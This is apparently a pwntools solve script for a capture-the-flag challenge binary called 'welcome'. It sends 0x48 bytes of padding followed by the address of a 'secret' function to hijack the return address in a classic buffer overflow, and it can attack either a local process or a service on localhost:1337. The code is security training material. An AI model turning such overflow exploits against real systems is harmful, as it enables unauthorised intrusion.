#!/usr/bin/env python3
from pwn import *

elf = ELF("./challenge/welcome")

HOST, PORT = "localhost", 1337

context.binary = elf
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

def main():
    global io

    # offset from return address
    offset = 0x48

    io = conn()

    io.recvuntil(": ")
    payload = flat(
        b'A'*offset,
        elf.sym.secret
    )
    io.sendline(payload)

    io.interactive()

def conn():
    global libc
    gdbscript = '''
    '''
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        p = process([elf.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
        return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
